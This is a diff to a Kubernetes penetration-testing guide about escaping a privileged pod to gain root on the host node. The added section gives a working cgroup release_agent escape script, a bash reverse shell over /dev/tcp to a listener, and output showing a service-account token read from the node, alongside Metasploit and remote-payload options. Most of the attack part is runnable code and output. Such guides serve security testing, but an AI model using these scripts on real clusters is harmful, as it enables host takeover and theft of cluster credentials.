@@ -1,6 +1,6 @@
 ## You can create a pod with only privileged: true
 
-If you only have `privileged=true`, you can use Felix Wilhelm's exploit to get non-interactive command execution as root on the underlying node running your pod. If you want an interactive shell, you'll have to either use Felix's exploit to download your shell and then again to execute it, or you can use the metasploit module “docker privileged container escape” which uses the same exploit to upgrade a shell recieved from a container to a shell on the host. 
+If you only have `privileged=true`, you can get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC undock.sh to execute one command a time, or you  can use Brandon Edwards and Nick Freeman’s version which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module “docker privileged container escape” which uses the same exploit to upgrade a shell received from a container to a shell on the host. 
 
 In either case, the kubernetes privesc paths as the same as with the other pods where you get root access on the node. One promising privesc path is available if you can schedule your pod to run on the control plane node using the `nodeName` selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
 
@@ -128,7 +128,51 @@ kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 Does the token allow you to view secrets in that namespace? How about other namespaces?
 Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
 
-### Option 2: Use the metasploit module: docker_privileged_container_escape
+
+### Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell
+
+#### Create escape script that will use the container escape POC to execute a connect back script on the host
+
+Drop this into `escape.sh`:
+
+```bash
+#!/bin/bash
+overlay=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+mkdir /tmp/escape
+mount -t cgroup -o blkio cgroup /tmp/escape
+mkdir -p /tmp/escape/w
+echo 1 > /tmp/escape/w/notify_on_release
+echo "$overlay/shell.sh" > /tmp/escape/release_agent
+sleep 3 && echo 0 >/tmp/escape/w/cgroup.procs &
+nc -l -p 9001
+```
+#### Find the IP address of your POD
+This next script, `shell.sh` is executed on the host node and it will call back to the listener on your pod, so you'll need to use the pod's IP
+
+
+#### Create the connect back script
+Drop this into `/shell.sh` on the pod. If you change the name of your script, change it in escape.sh as well. 
+```
+#!/bin/bash
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.100.254.137/9001 0>&1"
+```
+
+#### Make both scripts executable
+```bash
+chmod +x shell.sh escape.sh
+```
+
+#### Execute escape.sh from the pod, which spin up a listener for you and then make the host to execute shell.sh
+
+```bash
+root@pod-priv:/# ./escape.sh
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@k8s-worker:/# cat var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
+```
+
+### Option 3: Use the metasploit module: docker_privileged_container_escape
 
 #### Fire up your multi handler, using the -z flag to avoid interacting with the session
 ```bash
@@ -188,7 +232,8 @@ cat var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes
 eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
 ```
 
-### Option 3: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
+### Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
+I'm not sure why you would need this forth option, but I use this before I found Brandon Edwards and Nick Freeman's talk. It works, just adds an unecessary callback to a remote server. 
 
 #### Create a payload and host it on your remote box
 ```bash
@@ -211,7 +256,6 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 hostname
 k8s-worker
-
 ```
 
 ## What to look for on a node
